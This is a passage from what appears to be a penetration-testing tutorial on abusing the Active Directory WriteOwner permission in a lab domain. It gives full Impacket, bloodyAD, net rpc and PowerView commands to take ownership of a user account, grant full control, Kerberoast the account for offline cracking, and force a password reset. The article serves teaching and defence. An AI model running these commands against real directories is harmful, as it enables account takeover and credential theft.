+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyNveMQDcfkaShLq_T7WP0XlsHMwuLvDIWOHyjtIWy-7wXCeJlElNCzTv40jJE0GfqlCJz9MdWvSNdk-N94t3idpRv_UXuWErCccHCI-GMN3r_g8RHyYk9nN-gjD4sDOXlhCFvBYe7fB-aYh9B_2Nt1FMsV0uIodSsV1RghfTJqJZxwXIw47w-QRX9iLpB/s16000/57.png" alt="WriteOwner Active Directory Abuse" width="1352" height="646"/></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBia1gd3ZgLsdJkxGPkSmfx1CnkJExfmoBFVa7dkO0417r8QgUXECfmImHN7JXr5K7BdO4O5uCQydrI-eiFKXuMYIkcvRm3Nzo_K8DHj8muj4CcALhkPUHzyP3y0hxS073AWufwQiqDwcFvKNcXQrFM3h8Op0KTS4bb7xw1JgLqYcefRzIJAF8FTV-9D-2/s16000/58.png"/></p>
+<p><span style="color: #000000">From the graph it can be observed that the <strong>Sakshi</strong> user owns <strong>WriteOwner </strong>privilege on <strong>Ankur</strong> user.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfpJqO8PbMnE_RtfRYc-lz59QmM5ZW9u-8_USRdiO7qrWgkhe8kMWHkGpqL1JVZmdYzrFeM4LPcOmDPRSFb6OBDrtaSNSOs8xDaFNtJ0fvTuOpS-YXH3pT00882qJ2lVu6UhTid76_Nuc7TZdK6DkML2SOzScAQ36UNcXrIWWfH7DXBojdbjW-g1SoxP57/s16000/59.png" alt="WriteOwner Active Directory Abuse" width="825" height="483"/></p>
+<h3><span style="color: #000000"><span style="color: #800000">Method for Exploitation – Granting Ownership &amp; Full Control Followed by Kerberoasting (T1558.003) or Change Password (T1110.001)</span> </span></h3>
+<p><span style="color: #000000">Attackers can exploit the <em data-start="357" data-end="380">WriteOwner permission</em> when they gain control of an object that has this privilege over another directory object. This allows them to grant ownership, then assign full control, and ultimately perform attacks like <em data-start="595" data-end="610">Kerberoasting</em> or a <em data-start="620" data-end="637">Password Change</em> without knowing the victim’s current credentials.</span></p>
+<h4><span style="color: #000000">Linux Impacket tool – Granting Ownership &amp; Full Control</span></h4>
+<h5><span style="color: #000000"><strong>Granting Ownership:</strong></span></h5>
+<p><span style="color: #000000"><strong data-start="754" data-end="766">To begin</strong>, use the<strong data-start="776" data-end="798"><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>‘s toolkit</strong> from a UNIX-like system. The tool owneredit.py allows <strong data-start="859" data-end="881">changing ownership</strong> of a directory object.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-owneredit -action write -new-owner 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyoWdQGDAsje-iAzPI_FbRpjmDPz4ooo9sRLKY3_c8RJaaqCWzu_9WfLIAO6OXnHQRQZWsiRYswvcU6Gjo11kk5LlCc-qDuqCI9ceWXbvulI4DaRJlSwGtmquafGisYJlleos2qrhDniUER6-_Gygv5917onD_54gApAfk77-ETUHZ33XVGMY30lHxw6xN/s16000/60.png"/></p>
+<p><span style="color: #000000"> With the help of owneredit, the <strong data-start="1132" data-end="1142"><em data-start="1134" data-end="1140">DACL</em></strong> for the <strong data-start="1151" data-end="1174"><em data-start="1153" data-end="1160">Ankur</em> user object</strong> is successfully modified. As a result, the <strong data-start="1218" data-end="1262"><em data-start="1220" data-end="1228">Sakshi</em> user now owns the Ankur account</strong>.</span></p>
+<h5><span style="color: #000000"><strong>Granting Full Control:</strong></span></h5>
+<p><span style="color: #000000">Next, use dacledit.py to assign <strong data-start="1365" data-end="1383"><em data-start="1367" data-end="1381">Full Control</em></strong> to <strong data-start="1387" data-end="1397">Sakshi</strong> over the <strong data-start="1407" data-end="1416">Ankur</strong> user object.</span></p>
+<p><span style="color: #000000">From UNIX-like systems, this can be done with <strong><span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>‘s</span> </strong>dacledit.py (Python), alternatively Impacket-dacledit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEVUP0gBCJ3dfN9Hmr2ONnaizihu0pNPCWupl-DmVmi_chsOs8Jve0o7i3LBCUnDvIHAXw-TFd6Nd_nzMbukfhFvfEGd7bw4xXlJ2AZvkrAmjwu-ZHKSft-05e80qRA1IgXN14bqHFG7CEnDDpreT2MW-ZC_oNtVL5pUEeVC3u3jgHxIvCGK27svgxVZYw/s16000/61.png" alt="WriteOwner Active Directory Abuse" width="2864" height="1324"/></p>
+<p><span style="color: #000000">With the help of <strong>dacledit</strong>, the <strong>DACL</strong> for this object is successfully modified, and <strong>Sakshi</strong> now has <strong>full control</strong> over the <strong>Ankur</strong> user.</span></p>
+<p><span style="color: #000000">Now, since the user has full control over the target then it can either perform kerberoasting or can change the password without knowing target’s current password (<span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.hackingarticles.in/abusing-ad-dacl-forcechangepassword/">ForceChangePassword</a></strong></span>)</span></p>
+<h4><span style="color: #000000">Linux Python Script – TargetedKerberoast</span></h4>
+<p><span style="color: #000000">From UNIX-like systems, this can be done with <strong><span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py</a></span> </strong>(Python).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./targetedKerberoast.py --dc-ip '192.168.1.6' -v -d 'ignite.local' -u 'sakshi' -p 'Password@1'</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgurJq5FnDz6v-BubMjQJ20fDM7N7xwxvPtcP3LjKNcp53iEQIsWlqKtS5xJUbNVMGMXtwr7deNdaa-gak4idZTTEI7ZA3wkZ7oXnU6j8SOrIwK2pn7-IHwqjfMHfSQ0q5F0IeA3e2hfB_IjU2aZq1v4ZqtLClmGKYstMhe_uaqzv1qQdPrYFB0DRkhgPcr/s16000/62.png" alt="WriteOwner Active Directory Abuse" width="1559" height="491"/></p>
+<p><span style="color: #000000">Finally, once attackers dump hashes (e.g., from Kerberoasting), they can use tools like <strong>John the Ripper</strong> and common dictionaries such as <strong>RockYou.txt</strong> to <strong>brute-force weak passwords</strong>.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUkFk2K4QkRjNusTWfc-vecDKuckZMCWKejNzs0t06kdv5BqhwskmMwT_36tNnG20g8YzkxgYLV-YnEt9SRImYQlZ3Nxr36te_caKhxH0sgVjg-FunCbro19akvT_KYioUQMoiUa-i-29-_Nr9vHluXEVa4NuBcLWXG4Uc-oX-X5RJGo4TtqoNiT-0lkjN/s16000/63.png"/></p>
+<h3><span style="color: #800000">Linux – Change Password</span></h3>
+<p><span style="color: #000000"><strong>Linux Net RPC – Samba</strong></span></p>
+<p><span style="color: #000000">You can achieve this from a <strong>UNIX-like system</strong> with net, a tool for the administration of <strong>Samba</strong> and <strong>CIFS/SMB clients</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc password ankur 'Password@987' -U ignite.local/sakshi%'Password@1' -S 192.168.1.6</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizGm0aGjYB_fCnQ-YtTcMmFKeZOcY2VrMlWWbiVzROouctV7VDK3-E2HOFXIrwQakucgpyZlbCKrmOTlUdHO6tFWJuIwcOuZdXyD-D6hcJgoex1mzUG6skO18QKCOB2kYcjl-lMGBpGxqRs2pVH1XRECOoxxAEI2FyUDsOwIAZ6wlCBfWx9YazX3By4A31/s16000/64.png" alt="WriteOwner Active Directory Abuse" width="1473" height="87"/></p>
+<p><span style="color: #000000"><strong> Linux Bloody AD</strong></span></p>
+<p><span style="color: #000000">Alternatively, you can achieve this using <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/CravateRouge/bloodyAD"><strong>bloodyAD</strong></a></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.6" -d "ignite.local" -u "sakshi" -p "Password@1" set password "ankur" "Password@987"</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrWa99FCvw3vOq-CIjO_GzHcirw3qteTouyNYCKcylpGuF9Je5ThkdyQOn66QO0cF9zokWiAWgjvWlw4fQQRmLlUuiVKgWUyMsZ-IRVVOz5Yd-pIg9_AiAnHEbwS2lW5p6g4BElygk_WdhZsYs69BLSBErZIAS5LsoIGMc746Uggp-76IEUOnv4XawMVMC/s16000/65.png"/></p>
+<h3><span style="color: #800000">Windows PowerShell Powerview – Granting Ownership &amp; Full Control</span></h3>
+<p><span style="color: #000000">On Windows systems, attackers can <strong data-start="350" data-end="383">leverage the PowerView module</strong> to grant both <strong data-start="398" data-end="413"><em data-start="400" data-end="411">Ownership</em></strong> and <strong data-start="418" data-end="436"><em data-start="420" data-end="434">Full Control</em></strong> over a target object. This process involves two core cmdlets: <strong>Set-DomainObjectOwner and Add-DomainObjectAcl</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .PowerView.ps1
+Set-DomainObjectOwner -Identity 'ankur' -OwnerIdentity 'sakshi'
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ankur" -PrincipalIdentity "sakshi"</pre>
+<p><span style="color: #000000">This <strong data-start="739" data-end="760">assigns ownership</strong> of the <strong data-start="768" data-end="791"><em data-start="770" data-end="789">Ankur user object</em></strong> to the <strong data-start="799" data-end="816"><em data-start="801" data-end="809">Sakshi</em> user</strong>.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisk7yRwoF9OKLf4SPOOyOmAVFgtV3b9q9_aaHj-DPmGy2Y0o5uUl7sdwdaVw5wLWxnTQGnfVW7KUu2qjJ-b-SGnv1_rPZByKnbcPeoe22U2gmpWvylqWUQxJKJsrP1aM8kBepM6bQ-PAnLhsu83qZ1ddHVQD20wKF4fRGoxfeN2xLH3hW-5V7FV0LshTos/s16000/100.png" alt="WriteOwner Active Directory Abuse" width="1542" height="370"/></p>
+<p><span style="color: #000000"> With the help of <strong>Set-DomainObjectOwner</strong> and <strong>Add-DomainObjectAcl</strong>, the <strong data-start="1063" data-end="1073"><em data-start="1065" data-end="1071">DACL</em></strong> for the object is successfully updated. As a result, the <strong data-start="1131" data-end="1190"><em data-start="1133" data-end="1141">Sakshi</em> user gains full control over the Ankur account</strong>, including permissions to modify, reset, or delete it.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOexVcwnvYX5LrJOFaaqkI7i3MZitvUhY75J1DUwgBiWcxoXQ2eNz0sXiK1_Ks_qZ5WZD-F5dIrE8xR1RWVKKZNdYdFDl5jJ74GPc-U0A3L5Exh8_auMuxyrwxegFS-vIHY3vCfzhhILaEDojNWa4aa_vy50avRJfmChDEI7tyLO6Kc-z2ba4c0uA_QIG/s16000/101.png"/></p>
+<p><span style="color: #000000">Now, since the user has full control over the target then it can either perform kerberoasting or can change the password without knowing target’s current password (<span style="color: #0000ff"><a style="color: #0000ff" href="https://www.hackingarticles.in/abusing-ad-dacl-forcechangepassword/">ForceChangePassword</a></span>)</span></p>
+<h4><span style="color: #000000">Windows PowerShell Powerview – Kerberoasting</span></h4>
+<p><span style="color: #000000">To proceed, attackers can use <strong data-start="1446" data-end="1480">PowerView’s </strong>Set-DomainObject and Get-DomainSPNTicket to manipulate <strong data-start="1525" data-end="1561"><em data-start="1527" data-end="1533">SPNs</em> (Service Principal Names)</strong> and request service tickets for offline cracking.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-DomainObject -Identity 'ankur' -Set @{serviceprincipalname='nonexistent/hacking'}
+Get-DomainUser 'ankur' | Select serviceprincipalname
+$User = Get-DomainUser 'ankur'
+$User | Get-DomainSPNTicket</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNOMpA690QEuauuZE-kNSXchcO7RVb6fuSseJfwkW7PxIfwrin2_DN4BCTMoJXj79TlI-cM7Q5UBcbaSBcyjOgv9Jvg02oULdJSL0iRmBYWFMm0r1Y6iszHtRklmbMvw1_7xiE8bZzUbtRSpspktXVMwz-gkHbyxzinFjCV9xm7iaSdDrGDnFTIQSZbdIp/s16000/102.png" alt="WriteOwner Active Directory Abuse" width="1573" height="835"/></p>
+<p><span style="color: #000000"><strong data-start="1833" data-end="1850">Kerberoasting</strong> allows attackers to extract TGS tickets for SPN-enabled accounts and then <strong data-start="1925" data-end="1953">brute-force them offline</strong> using hash cracking tools.</span></p>
+<h4><span style="color: #000000">Windows PowerShell Powerview – Change Password</span></h4>
+<p><span style="color: #000000">The attacker can change the password of the user using PowerView module. This can be achieved with <strong>Set-DomainUserPassword</strong> cmdlet.</span></p>
+<p><span style="color: #000000">Alternatively, <strong data-start="2049" data-end="2093">if the attacker prefers account takeover</strong>, they can <strong data-start="2104" data-end="2134">change the user’s password</strong> without knowing the current one.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'ankur' -AccountPassword $NewPassword</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifqGYeDNt_KORXWJpF3HFHbOVO9fNBqKj2E6BXYIPHTnL0VgFbQw-zqGhRmrB4H1tDuAZiaUREjdMAuhXwKAjTH-H9XTYAX-wiz75h4d8dbNZlEgG0J6olTYmZ-J9vp5rhsyU49VC-0KOmntmbDRTZo_zjUrjV3xbQzlLzegoBxLwZm-5sCZFlah8zp-yC/s16000/103.png"/></p>
+<p><span style="color: #000000"> The <strong data-start="2407" data-end="2448"><em data-start="2409" data-end="2417">Sakshi</em> user resets Ankur’s password</strong> without any knowledge of the original, ensuring complete account compromise.</span></p>
+<h3><span style="color: #800000">Detection &amp; Mitigation</span></h3>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEja3bUwmVYsTOluHeOnuGcWVdcl8sj7UFIjihMuv6amgXyjcIS72NClOdb39fyBpGBGEi_CUtc1HPHcyavs3O7xg7FvTsA9DTIUz1GTCw42DGPYONNhqfFJSeyicoqRbFw7_akU2P0X6nWrhPb3UGY5vh0_7KWzEFA9VAJjhIHDWdoHCBUsiZk31PAmXabg/s16000/Detection%20&amp;%20Mitigation%20Attack%20MITRE%20ATT&amp;CK%20Technique%20Description%20Detection%20Mitigation%20Reset%20Password%20T1110.001%20%E2%80%93%20Password%20Cracking%20Attackers%20with%20Generic%20ALL%20permissions%20can%20reset%20the%20target%20user%E2%80%99%20(1).png" alt="WriteOwner Active Directory Abuse" width="3005" height="4250"/></p>
+<p><span style="color: #000000"><strong>Author</strong>: Pradnya Pawar is an InfoSec researcher and Security Tech Lead. Contact</span> <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.linkedin.com/in/pradnya-pawar-12bb4844"><strong>here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/genericall-active-directory-abuse/" title="Abusing AD-DACL : Generic ALL Permissions">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Abusing AD-DACL : Generic ALL Permissions</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" title="Abusing AD-DACL: ForceChangePassword">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Abusing AD-DACL: ForceChangePassword</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" rel="prev">Abusing AD-DACL: WriteDacl</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/" rel="next">Active Directory Pentesting Using Netexec Tool</a></div></div>
+	</nav>        </div>
